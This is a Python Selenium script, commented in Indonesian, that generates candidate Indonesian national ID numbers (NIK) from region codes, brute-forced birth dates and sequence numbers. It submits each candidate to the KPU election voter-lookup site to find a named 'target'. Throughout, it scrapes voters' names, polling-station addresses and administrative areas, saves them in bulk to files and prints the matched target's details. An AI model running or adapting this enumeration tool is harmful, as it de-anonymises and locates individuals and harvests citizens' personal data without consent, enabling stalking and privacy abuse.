from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.chrome.options import Options

from datetime import date, timedelta
import time
import sys
import os
import signal

# Global variables untuk checkpoint dan driver
checkpoint_requested = False
checkpoint_stats = {
    'total_retries': 0,
    'timeout_count': 0
}
current_driver = None
chrome_options = None

def signal_handler(sig, frame):
    """Handler untuk CTRL+C - set checkpoint flag"""
    global checkpoint_requested
    checkpoint_requested = True
    print("\n\n🔄 Checkpoint requested...")

def setup_signal_handler():
    """Setup signal handler untuk CTRL+C"""
    signal.signal(signal.SIGINT, signal_handler)

def setup_chrome_driver():
    """Initialize Chrome WebDriver dengan konfigurasi yang tepat"""
    global chrome_options
    
    chrome_options = Options()
    chrome_options.add_argument("--headless")  # head for GUI, headless for hide
    chrome_options.add_argument("--disable-gpu")  # Disarankan untuk mode headless
    chrome_options.add_argument("--window-size=1920,1080")  # Atur ukuran jendela virtual
    chrome_options.add_argument("--log-level=3")  # bersihkan error driver warning
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-plugins")
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        return driver
    except Exception as e:
        print(f"Error saat memulai browser: {e}")
        return None

def check_driver_health(driver):
    """Periksa apakah driver masih aktif dan responsif"""
    try:
        # Test basic command
        driver.current_url
        driver.title
        return True
    except Exception:
        return False

def recover_driver():
    """Pulihkan driver yang rusak dengan membuat instance baru"""
    global current_driver
    
    print("⚠️  Driver session lost, attempting recovery...")
    
    # Tutup driver lama jika masih ada
    try:
        if current_driver:
            current_driver.quit()
    except:
        pass
    
    # Buat driver baru
    current_driver = setup_chrome_driver()
    
    if current_driver:
        print("✅ Driver recovered successfully")
        try:
            current_driver.get("https://cekdptonline.kpu.go.id/")
            wait = WebDriverWait(current_driver, 5)
            if wait_for_page_ready(current_driver, wait):
                print("✅ Website loaded successfully")
                return True
            else:
                print("❌ Failed to load website after recovery")
                return False
        except Exception as e:
            print(f"❌ Error loading website after recovery: {e}")
            return False
    else:
        print("❌ Failed to recover driver")
        return False

def wait_for_page_ready(driver, wait):
    """Menunggu halaman siap untuk input baru"""
    try:
        # Tunggu sampai input field tersedia dan bersih
        input_field = wait.until(EC.element_to_be_clickable((By.XPATH, '//input[@type="text"]')))
        
        # Pastikan halaman sudah selesai loading dengan menunggu tombol pencarian
        search_button = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[contains(.,"Pencarian")]')))
        
        # Tambahan: tunggu sebentar untuk memastikan JavaScript selesai
        time.sleep(0.1) # 0.2 for standart
        
        return True
    except TimeoutException:
        print(" -> Timeout waiting for page ready")
        return False

def handle_checkpoint(current_index, total_niks, results):
    """Handle checkpoint pause dan resume dengan driver recovery"""
    global checkpoint_requested, checkpoint_stats, current_driver
    
    if checkpoint_requested:
        print(f"\n{'='*50}")
        print(f"📊 CHECKPOINT STATUS")
        print(f"{'='*50}")
        print(f"Progress: {current_index}/{total_niks} ({(current_index/total_niks*100):.1f}%)")
        print(f"Results found: {len([r for r in results if isinstance(r[1], dict) and r[1].get('nama')])}")
        print(f"Timeouts encountered: {checkpoint_stats['timeout_count']}")
        print(f"Success rate: {((current_index - checkpoint_stats['timeout_count']) / current_index * 100):.1f}%" if current_index > 0 else "0.0%")
        print(f"{'='*50}")
        
        input("program has stopped, press (ENTER) to continue . . . . . . > ")
        print("🔄 Resuming process...")
        
        # Periksa dan pulihkan driver jika diperlukan
        if not check_driver_health(current_driver):
            if not recover_driver():
                print("❌ Failed to recover driver, program will exit")
                sys.exit(1)
        else:
            print("✅ Driver is healthy, continuing...")
        
        print("")  # Empty line for clarity
        checkpoint_requested = False

def generate_niks_bruteforce(prov, city, dist, gender, start_year, end_year, unique_start, unique_end):
    """Membuat daftar NIK dengan brute-force rentang tanggal lahir."""
    nik_list = []
    start_date = date(start_year, 7, 1)
    end_date = date(end_year, 6, 30)
    current_date = start_date
    while current_date <= end_date:
        day = current_date.day
        month = current_date.month
        year = str(current_date.year)[-2:]
        day_for_nik = day + 40 if gender.lower() == 'p' else day
        dob_str = f"{day_for_nik:02d}{month:02d}{year}"
        for i in range(unique_start, unique_end + 1):
            unique_code = f"{i:04d}"
            nik = f"{prov}{city}{dist}{dob_str}{unique_code}"
            nik_list.append(nik)
        current_date += timedelta(days=1)
    return nik_list

def generate_niks_specific(prov, city, dist, dob, unique_start, unique_end):
    """Membuat daftar NIK dengan tanggal lahir spesifik."""
    nik_list = []
    for i in range(unique_start, unique_end + 1):
        unique_code = f"{i:04d}"
        nik = f"{prov}{city}{dist}{dob}{unique_code}"
        nik_list.append(nik)
    return nik_list

def extract_field_value(driver, field_name):
    """Ekstrak nilai field berdasarkan nama field"""
    try:
        # Cari span yang berisi nama field, lalu ambil text setelahnya
        xpath = f'//span[text()="{field_name}"]/following-sibling::text()[1] | //span[text()="{field_name}"]/../text()[normalize-space()]'
        element = driver.find_element(By.XPATH, xpath)
        return element.strip().strip('"')
    except:
        try:
            # Alternatif: cari berdasarkan parent div
            xpath = f'//span[text()="{field_name}"]/parent::*'
            parent_element = driver.find_element(By.XPATH, xpath)
            text = parent_element.text.replace(field_name, "").strip().strip('"')
            return text
        except:
            return "NOT FOUND"

def create_log_directory():
    """Membuat direktori log jika belum ada"""
    # Dapatkan direktori dimana script ini berada
    script_dir = os.path.dirname(os.path.abspath(__file__))
    log_dir = os.path.join(script_dir, "progress")
    
    # Alternatif: tetap gunakan Downloads folder
    # log_dir = os.path.join(os.path.expanduser("~"), "Downloads", "progress")
    
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    return log_dir

def parse_existing_data(content):
    """Parse existing file content to extract individual records"""
    records = {}
    if not content.strip():
        return records
    
    # Split by double newline to get individual records
    blocks = content.strip().split('\n\n')
    
    for block in blocks:
        lines = block.strip().split('\n')
        record_data = {}
        
        for line in lines:
            if ':' in line:
                key, value = line.split(':', 1)
                key = key.strip()
                value = value.strip()
                record_data[key] = value
        
        # If we have a complete record with NIK and Nama
        if 'NIK' in record_data and 'Nama' in record_data:
            nik = record_data['NIK']
            nama = record_data['Nama']
            # Use NIK+NAMA as unique key
            unique_key = f"{nik}|{nama}"
            records[unique_key] = record_data
    
    return records

def save_data_to_file(data_list, log_dir):
    """Save data ke file berdasarkan area code with duplicate detection (NIK + NAMA)"""
    if not data_list:
        return
    
    # Group data by area code
    grouped_data = {}
    for nik, voter_data, status in data_list:
        if isinstance(voter_data, dict):
            area_code = nik[:6]
            if area_code not in grouped_data:
                grouped_data[area_code] = []
            
            # Tambahkan NIK ke data
            voter_data['nik'] = nik
            grouped_data[area_code].append(voter_data)
    
    # Save each group to separate file
    for area_code, data_group in grouped_data.items():
        file_path = os.path.join(log_dir, f"{area_code}.txt")
        
        # Read and parse existing content
        existing_records = {}
        if os.path.exists(file_path):
            try:
                with open(file_path, 'r', encoding='utf-8') as f:
                    existing_content = f.read()
                    existing_records = parse_existing_data(existing_content)
            except Exception as e:
                print(f"Error reading existing file: {e}")
        
        # Process new data and check for duplicates
        updated_count = 0
        added_count = 0
        
        for data in data_group:
            nik = data['nik']
            nama = data['nama']
            unique_key = f"{nik}|{nama}"  # NIK + NAMA as unique identifier
            
            # Check if this NIK+NAMA combination already exists
            if unique_key in existing_records:
                # Update existing record (NIK + NAMA match)
                existing_records[unique_key] = {
                    'NIK': nik,
                    'Nama': nama,
                    'Alamat': data.get('alamat_tps', 'N/A'),
                    'Kelurahan': data.get('kelurahan', 'N/A'),
                    'Kecamatan': data.get('kecamatan', 'N/A'),
                    'Kabupaten': data.get('kabupaten', 'N/A')
                }
                updated_count += 1
                print(f"🔄 Updated: {nik} - {nama}")
            else:
                # Add new record (NIK + NAMA combination is new)
                existing_records[unique_key] = {
                    'NIK': nik,
                    'Nama': nama,
                    'Alamat': data.get('alamat_tps', 'N/A'),
                    'Kelurahan': data.get('kelurahan', 'N/A'),
                    'Kecamatan': data.get('kecamatan', 'N/A'),
                    'Kabupaten': data.get('kabupaten', 'N/A')
                }
                added_count += 1
                print(f"➕ Added: {nik} - {nama}")
        
        # Write all records to file
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                for i, (unique_key, record) in enumerate(existing_records.items()):
                    if i > 0:  # Add separator between records
                        f.write('\n')
                    
                    f.write(f"NIK               : {record['NIK']}\n")
                    f.write(f"Nama              : {record['Nama']}\n")
                    f.write(f"Alamat            : {record['Alamat']}\n")
                    f.write(f"Kelurahan         : {record['Kelurahan']}\n")
                    f.write(f"Kecamatan         : {record['Kecamatan']}\n")
                    f.write(f"Kabupaten         : {record['Kabupaten']}\n\n")
            
            print(f"✅ File saved: {file_path}")
            print(f"📊 Summary: {added_count} new, {updated_count} updated, {len(existing_records)} total records")
            
        except Exception as e:
            print(f"❌ Error saving to {file_path}: {e}")

def extract_voter_data(driver, wait):
    """Ekstrak semua data pemilih dari halaman hasil"""
    try:
        # Ekstrak nama pemilih
        nama_element = wait.until(EC.presence_of_element_located(
            (By.XPATH, '//p[span[text()="Nama Pemilih"]]')
        ))
        nama = nama_element.text.replace("Nama Pemilih", "").strip()
        
        # Ekstrak data lokasi menggunakan xpath yang lebih spesifik
        data = {
            'nama': nama,
            'kabupaten': extract_field_value(driver, "Kabupaten"),
            'kecamatan': extract_field_value(driver, "Kecamatan"), 
            'kelurahan': extract_field_value(driver, "Kelurahan"),
            'alamat_tps': extract_field_value(driver, "Alamat Potensial TPS")
        }
        
        return data
        
    except Exception as e:
        print(f"Error ekstraksi data: {e}")
        return None

def process_single_nik(driver, wait, nik, target_name, max_retries=3):
    """
    Proses satu NIK dengan retry otomatis untuk timeout
    Returns: (result_type, data, status)
    - result_type: "SUCCESS", "NOT_FOUND", "TIMEOUT", "ERROR"  
    - data: voter_data dict atau error message
    - status: "SUITABLE", "DIFF", "ERROR"
    """
    global checkpoint_stats, current_driver
    
    SUCCESS_XPATH = '//p[span[text()="Nama Pemilih"]]'
    FAILURE_XPATH = '//h2[b[text()="Data anda belum terdaftar!"]]'
    
    for retry in range(max_retries):
        try:
            # Periksa kesehatan driver sebelum operasi
            if not check_driver_health(driver):
                print(f" -> Driver unhealthy, attempting recovery...")
                if recover_driver():
                    driver = current_driver
                    wait = WebDriverWait(driver, 1)
                else:
                    return "ERROR", "Driver recovery failed", "DIFF"
            
            # Pastikan halaman siap sebelum input NIK
            if not wait_for_page_ready(driver, wait):
                print(f" -> Page not ready (retry {retry+1}), refreshing...")
                try:
                    driver.refresh()
                    if not wait_for_page_ready(driver, wait):
                        if retry < max_retries - 1:
                            continue
                        else:
                            return "ERROR", "Failed to load page after retries", "DIFF"
                except Exception as refresh_error:
                    print(f" -> Refresh failed: {refresh_error}")
                    if not recover_driver():
                        return "ERROR", "Driver recovery failed", "DIFF"
                    driver = current_driver
                    wait = WebDriverWait(driver, 1)
                    continue
            
            # Cari dan bersihkan input field
            kolom_nik = wait.until(EC.element_to_be_clickable((By.XPATH, '//input[@type="text"]')))
            kolom_nik.clear()
            
            # Tambahan delay untuk memastikan field benar-benar bersih
            time.sleep(0.05) # 0.2 for standart, 0.1 for fast
            
            # Input NIK dengan delay kecil untuk stabilitas
            kolom_nik.send_keys(nik)
            
            # Pastikan tombol pencarian bisa diklik
            tombol_cari = wait.until(EC.element_to_be_clickable((By.XPATH, '//button[contains(.,"Pencarian")]')))
            tombol_cari.click()

            # Tunggu hasil pencarian
            found_element = wait.until(
                EC.presence_of_element_located(
                    (By.XPATH, f"{SUCCESS_XPATH} | {FAILURE_XPATH}")
                )
            )

            element_text = found_element.text
            if "Nama Pemilih" in element_text:
                # Ekstrak semua data
                voter_data = extract_voter_data(driver, wait)
                
                if voter_data:
                    nama_web = voter_data['nama']
                    print(f" -> '{nama_web}'")
                    
                    if target_name.lower() in nama_web.lower():
                        print(f"✅ FOUND! NIK: {nik} | Nama: {nama_web}")
                        return "SUCCESS", voter_data, "SUITABLE"
                    else:
                        return "SUCCESS", voter_data, "DIFF"
                else:
                    print(" -> extraction error")
                    return "ERROR", "EXTRACTION_ERROR", "DIFF"
            else:
                print(" -----------------")
                return "NOT_FOUND", "NOT FOUND", "DIFF"

        except TimeoutException:
            if retry < max_retries - 1:
                print(f"xxxxxxxxx TIMEOUT (retry {retry+1}/{max_retries}) xxxxxxxxx")
                try:
                    driver.refresh()
                    time.sleep(0.5)  # Wait sedikit sebelum retry
                    continue
                except Exception:
                    # Driver bermasalah, coba recovery
                    if recover_driver():
                        driver = current_driver
                        wait = WebDriverWait(driver, 1)
                        continue
                    else:
                        checkpoint_stats['timeout_count'] += 1
                        return "TIMEOUT", "TIMEOUT", "DIFF"
            else:
                print(f"xxxxxxxxx TIMEOUT (final attempt) xxxxxxxxx")
                checkpoint_stats['timeout_count'] += 1
                return "TIMEOUT", "TIMEOUT", "DIFF"
                
        except Exception as e:
            if retry < max_retries - 1:
                print(f" -> error (retry {retry+1}/{max_retries}): {str(e)[:100]}...")
                try:
                    driver.refresh()
                    time.sleep(0.5)  # Wait sedikit sebelum retry
                    continue
                except Exception:
                    # Driver bermasalah, coba recovery
                    if recover_driver():
                        driver = current_driver
                        wait = WebDriverWait(driver, 1)
                        continue
                    else:
                        return "ERROR", f"ERROR: {e}", "DIFF"
            else:
                print(f" -> error (final attempt): {str(e)[:100]}...")
                return "ERROR", f"ERROR: {e}", "DIFF"
    
    # Shouldn't reach here, but just in case
    return "ERROR", "Unknown error", "DIFF"

def main():
    global checkpoint_stats, current_driver
    
    print("======================================================")
    print("=             AANNJJAAAAYYY !!!!! WELCOME            =")
    print("=                  by BAPA X KENCUR                  =")
    print("=                WITH TIMEOUT RETRY                  =")
    print("=                & CHECKPOINT FEATURE                =")
    print("======================================================")

    # Setup signal handler untuk CTRL+C
    setup_signal_handler()

    target_name = input("Target Entry: ")
    province_code = input("Province Code : ")
    city_code = input("City Code : ")

    district_code = input("District Code : ")

    if district_code == "00":
        distric_code_start = input("District Code 1 : ")
        distric_code_end = input("District Code ~ : ")
    else:
        distric_code_start = district_code
        distric_code_end = district_code

    print("\nTL input (DDMMYY).")
    print("'000000' brute mode.")
    dob_input = input("TL Input (DDMMYY): ")

    daftar_nik = []

    if dob_input == "000000":
        # Minta gender saat brute force tanggal lahir
        while True:
            gender = input("Gender target (L/P): ").strip().upper()
            if gender in ['L', 'P']:
                break
            else:
                print("Input gender tidak valid! Masukkan 'L' untuk Laki-laki atau 'P' untuk Perempuan.")
        try:
            gen1 = int(input("gen 1: "))
            gen2 = int(input("gen 2: "))
            unique_start = int(input("unique code 1: "))
            unique_end = int(input("unique code ~: "))
        except ValueError as e:
            print(f"Input tidak valid: {e}. Program berhenti.")
            sys.exit()

        for dist_code_int in range(int(distric_code_start), int(distric_code_end) + 1):
            dist_code_str = f"{dist_code_int:02d}"
            print(f"\nbrute-force 01/07/{gen1} - 30/06/{gen2} district {dist_code_str}")
            partial_nik_list = generate_niks_bruteforce(
                province_code,
                city_code,
                dist_code_str,
                gender,
                gen1,
                gen2,
                unique_start,
                unique_end
            )
            daftar_nik.extend(partial_nik_list)

    else:
        try:
            unique_start = int(input("unique code 1: "))
            unique_end = int(input("unique code ~: "))
        except ValueError as e:
            print(f"Input tidak valid: {e}. Program berhenti.")
            sys.exit()

        for dist_code_int in range(int(distric_code_start), int(distric_code_end) + 1):
            dist_code_str = f"{dist_code_int:02d}"
            partial_nik_list = generate_niks_specific(
                province_code,
                city_code,
                dist_code_str,
                dob_input,
                unique_start,
                unique_end
            )
            daftar_nik.extend(partial_nik_list)

    if not daftar_nik:
        print("Tidak ada NIK yang dihasilkan. Program berhenti.")
        sys.exit()

    print(f"\nTotal : {len(daftar_nik)} code")
    # Hitung total detik dengan retry consideration
    total_detik = len(daftar_nik) * 1.25  # second per code
    jam = total_detik // 3600
    sisa_detik = total_detik % 3600
    menit = sisa_detik // 60
    detik = sisa_detik % 60

    print(f"Time   : {int(jam)} jam {int(menit)} menit {detik:.2f} detik (estimate without retries)")
    print("💡 Use CTRL+C during scanning to pause and resume")

    # Input max retry attempts
    try:
        max_retries = int(input("Max retry untuk timeout (default: 3): ") or "3")
        if max_retries < 1:
            max_retries = 3
    except ValueError:
        max_retries = 3

    if input("Run program? (y/n): ").lower() != 'y':
        print("Program dibatalkan.")
        sys.exit()

    print("..................... Brute forcing >>>")

    # Setup Chrome driver
    print("🔧 Initializing Chrome WebDriver...")
    current_driver = setup_chrome_driver()
    
    if not current_driver:
        print("❌ Failed to initialize Chrome WebDriver. Make sure chromedriver is installed.")
        sys.exit()

    try:
        current_driver.get("https://cekdptonline.kpu.go.id/")
        # Tunggu halaman awal siap
        wait = WebDriverWait(current_driver, 5)
        if not wait_for_page_ready(current_driver, wait):
            print("❌ Failed to load website")
            current_driver.quit()
            sys.exit()
        print("✅ Website loaded successfully")
    except Exception as e:
        print(f"❌ Error loading website: {e}")
        current_driver.quit()
        sys.exit()

    results = []
    found = False
    wait = WebDriverWait(current_driver, 1)  # 5 for standart, 1 for fast

    for index, nik in enumerate(daftar_nik):
        if found:
            break
        
        # Check for checkpoint request
        handle_checkpoint(index, len(daftar_nik), results)
        
        # Update wait object jika driver berubah
        if current_driver:
            wait = WebDriverWait(current_driver, 1)
            
        print(f"enum {index + 1}/{len(daftar_nik)}: {nik}", end="")
        
        # Process NIK dengan retry logic
        result_type, data, status = process_single_nik(current_driver, wait, nik, target_name, max_retries)
        
        # Handle results
        if result_type == "SUCCESS" and status == "SUITABLE":
            results.append((nik, data, status))
            found = True
            print("2 sec for enum")
            time.sleep(2)  # 5 for standart, 2 for fast
        else:
            if result_type == "SUCCESS":
                results.append((nik, data, status))
            else:
                results.append((nik, data, "DIFF"))
        
        # Refresh halaman untuk NIK berikutnya (kecuali jika sudah found)
        if not found and current_driver:
            try:
                current_driver.refresh()
            except Exception as refresh_error:
                print(f" -> Refresh error: {refresh_error}")
                if not recover_driver():
                    print("❌ Critical error: Cannot recover driver")
                    break

    # Cleanup
    try:
        if current_driver:
            current_driver.quit()
    except:
        pass

    # Print statistics SEBELUM auto saving
    print(f"\n========== PROCESSING STATISTICS ==========")
    print(f"Total NIK processed: {len(results)}")
    print(f"Final timeouts: {checkpoint_stats['timeout_count']}")
    print(f"Success rate: {((len(results) - checkpoint_stats['timeout_count']) / len(results) * 100):.1f}%" if len(results) > 0 else "0.0%")

    # Auto save log file
    print(f"\n=========== AUTO SAVING LOG FILE ===========")
    
    # Filter data yang berhasil ditemukan (ada nama pemilih)
    valid_results = [r for r in results if isinstance(r[1], dict) and r[1].get('nama')]
    
    if valid_results:
        # Tampilkan preview area codes yang akan disave
        area_codes = set()
        for nik, data, status in valid_results:
            area_codes.add(nik[:6])
        
        print(f"===== Auto saving to files: {', '.join(sorted(area_codes))}")
        
        # Create log directory dan save data
        log_dir = create_log_directory()
        save_data_to_file(valid_results, log_dir)
        
        print(f"\n✅ Log files automatically saved to: {log_dir}")
        print(f"📁 Total files created/updated: {len(area_codes)}")
    else:
        print("❌ No valid data to save.")
        print("⚠️  No log file created (no voter data found).")

    # Laporan Hasil Akhir - Hanya yang cocok
    print(f"\n=========== TARGET DATA REVEALED ===========")
    found_results = [r for r in results if r[2] == "SUITABLE"]

    if found_results:
        for result in found_results:
            nik, data, status = result
            if isinstance(data, dict):
                print(f"NIK      : {nik}")
                print(f"Nama     : {data['nama']}")
                print(f"Alamat   : {data['alamat_tps']}")
                print(f"Kelurahan: {data['kelurahan']}")
                print(f"Kecamatan: {data['kecamatan']}")
                print(f"Kabupaten: {data['kabupaten']}")
                print()  # Baris kosong untuk pemisah jika ada multiple hasil
    else:
        print("No target found, this one is an asshole.")

if __name__ == "__main__":
    main()